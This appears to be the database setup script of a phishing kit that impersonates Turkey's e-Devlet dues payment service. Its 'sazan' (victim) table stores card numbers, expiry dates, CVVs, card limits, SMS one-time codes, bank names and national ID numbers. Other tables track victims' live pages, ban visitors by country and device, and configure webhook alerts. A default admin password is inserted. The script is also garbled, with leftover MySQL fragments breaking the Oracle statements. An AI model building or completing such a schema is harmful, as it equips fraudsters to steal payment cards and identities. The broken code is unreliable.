-- =====================================================
-- E-DEVLET AİDAT SİSTEMİ - VERİTABANI KURULUM
-- =====================================================
-- Oracle SQL'de çalıştırın
-- sqlplus username/password@database @edevletaidat.sql
-- =====================================================
-- Güncelleme: 15 Kasım 2025
-- =====================================================

-- Not: Bu dosya MySQL için yazılmıştır. Oracle SQL'e dönüştürülmesi gerekiyor.
-- Oracle'da veritabanı yerine tablespace ve schema kullanılır.

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı back
--

CREATE TABLE back (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  back VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_back ON back(back);

-- --------------------------------------------------------
--
-- Tablo için tablo yapısı ban
--

CREATE TABLE ban (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  ban VARCHAR2(255) NOT NULL,
  ulke CLOB NOT NULL,
  date_val VARCHAR2(255) NOT NULL,
  cihaz VARCHAR2(255) NOT NULL,
  tarayici VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_ban ON ban(ban);
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci;

--
-- Tablo için tablo yapısı hata1
--

CREATE TABLE hata1 (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  hata1 VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_hata1 ON hata1(hata1);
  INDEX `idx_hata1` (`hata1`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
--
-- Tablo için tablo yapısı hata2
--

CREATE TABLE hata2 (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  hata2 VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_hata2 ON hata2(hata2);
  `hata2` varchar(255) NOT NULL,
  INDEX `idx_hata2` (`hata2`)
--
-- Tablo için tablo yapısı hata3
--

CREATE TABLE hata3 (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  hata3 VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_hata3 ON hata3(hata3);
  `id` INT AUTO_INCREMENT PRIMARY KEY,
  `hata3` varchar(255) NOT NULL,
--
-- Tablo için tablo yapısı ips
--

CREATE TABLE ips (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  ipAddress VARCHAR2(255) NOT NULL UNIQUE,
  lastOnline NUMBER NOT NULL
);

CREATE INDEX idx_lastOnline ON ips(lastOnline);
  `ipAddress` varchar(255) NOT NULL,
  `lastOnline` bigint(255) NOT NULL,
  UNIQUE KEY `ipAddress` (`ipAddress`),
--
-- Tablo için tablo yapısı paneldekiler
--

CREATE TABLE paneldekiler (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  ip CLOB NOT NULL,
  tarih CLOB NOT NULL,
  tarayici VARCHAR2(255) NOT NULL,
  durum CLOB NOT NULL
);
  `ip` text NOT NULL,
  `tarih` text NOT NULL,
  `tarayici` varchar(255) NOT NULL,
--
-- Tablo için tablo yapısı sazan
--

CREATE TABLE sazan (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  date_val VARCHAR2(255) NOT NULL,
  kk VARCHAR2(255) DEFAULT NULL,
  sonkul VARCHAR2(255) DEFAULT NULL,
  cvv VARCHAR2(255) DEFAULT NULL,
  kartlimit VARCHAR2(50) DEFAULT NULL,
  sms VARCHAR2(255) DEFAULT NULL,
  now VARCHAR2(255) DEFAULT 'Anasayfa' NOT NULL,
  back NUMBER DEFAULT 0 NOT NULL,
  ip VARCHAR2(255) NOT NULL,
  lastOnline NUMBER DEFAULT NULL,
  banka VARCHAR2(255) DEFAULT NULL,
  tc VARCHAR2(255) NOT NULL,
  cihaz VARCHAR2(255) NOT NULL,
  tarayici VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_ip ON sazan(ip);
CREATE INDEX idx_now ON sazan(now);
  `cihaz` varchar(255) NOT NULL,
  `tarayici` varchar(255) NOT NULL,
--
-- Tablo için tablo yapısı site
--

CREATE TABLE site (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  pass CLOB NOT NULL,
  kart_sesi NUMBER DEFAULT 0 NOT NULL,
  sms_sesi NUMBER DEFAULT 0 NOT NULL,
  webhook NUMBER DEFAULT 0 NOT NULL,
  webhookURL VARCHAR2(255) NOT NULL,
  tutar VARCHAR2(255) NOT NULL
);

--
-- Tablo döküm verisi site
--

INSERT INTO site (pass, kart_sesi, sms_sesi, webhook, webhookURL, tutar) VALUES
('admin123', 0, 0, 0, '.', '150');
--
-- Tablo döküm verisi `site`
--
--
-- Tablo için tablo yapısı sms
--

CREATE TABLE sms (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  sms VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_sms ON sms(sms);

CREATE TABLE `sms` (
--
-- Tablo için tablo yapısı tebrik
--

CREATE TABLE tebrik (
  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  tebrik VARCHAR2(255) NOT NULL
);

CREATE INDEX idx_tebrik ON tebrik(tebrik);
--

CREATE TABLE `tebrik` (
  `id` INT AUTO_INCREMENT PRIMARY KEY,
  `tebrik` varchar(255) NOT NULL,
  INDEX `idx_tebrik` (`tebrik`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- =====================================================
COMMIT;
-- Admin Panel Şifre: admin123 (değiştirin!)
-- =====================================================

COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
